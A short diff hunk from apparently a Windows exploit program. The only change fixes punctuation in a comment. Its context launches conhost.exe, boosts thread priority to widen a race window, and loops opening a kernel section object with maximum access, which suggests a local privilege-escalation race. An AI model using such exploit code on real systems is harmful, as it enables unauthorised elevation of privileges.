@@ -315,7 +315,7 @@ int wmain(int argc, wchar_t** argv)
     shi.lpFile = L"C:\\Windows\\System32\\conhost.exe";
     ShellExecuteEx(&shi);
 
-    // Boost priority to improve race-window odds, yield instead of spinning.
+    // Boost priority to improve race-window odds; yield instead of spinning.
     SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
     do {
         _NtOpenSection(&hmapping, MAXIMUM_ALLOWED, &objattr);
